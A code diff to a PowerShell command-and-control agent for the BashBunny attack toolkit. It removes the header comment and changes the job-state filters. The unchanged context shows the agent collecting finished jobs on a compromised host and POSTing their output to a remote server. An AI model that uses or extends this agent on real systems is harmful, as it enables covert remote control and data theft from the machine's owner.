@@ -1,14 +1,3 @@
-<#
-.Synopsis
-BashBunny Powershell Agent
-Author: PoSHMagiC0de
-
-.DESCRIPTION
-This is a Powershell agent for the BashBunny Total P0wn System.
-.EXAMPLE
-Invoke-bbAgent -ServerIP "serverip" -Port portnumber
-#>
-
 function Invoke-bbAgent
 {
     [CmdletBinding()]
@@ -101,7 +90,7 @@ function Invoke-bbAgent
             if(Test-Connection -ComputerName $ServerIP -Count 1 -Quiet)
             {
                 Write-Verbose "Checking for finished jobs."
-                $doneJobs = Get-Job | where {$_.State -in @("Completed","Blocked","Failed")}
+                $doneJobs = Get-Job | where {@("Completed","Blocked","Failed") -contains $_.State}
                 if($doneJobs)
                 {
                     Write-Verbose "Jobs were found, processing."
@@ -130,7 +119,7 @@ function Invoke-bbAgent
                             $webc.UploadString($dataURL, "POST", $jobJSON)
                         }
                     }
-                    $doneJobs | where {$_.state -in @("Blocked","Failed")} | foreach {
+                    $doneJobs | where {@("Blocked","Failed") -contains $_.State} | foreach {
                         Write-Verbose ("Blocked and Failed Jobs are: {0}" -f ($_ | out-string))
                         $jobData = "Job was terminated because it failed or was in block state for user input.`r`n"
                         if($_.HasMoreData)
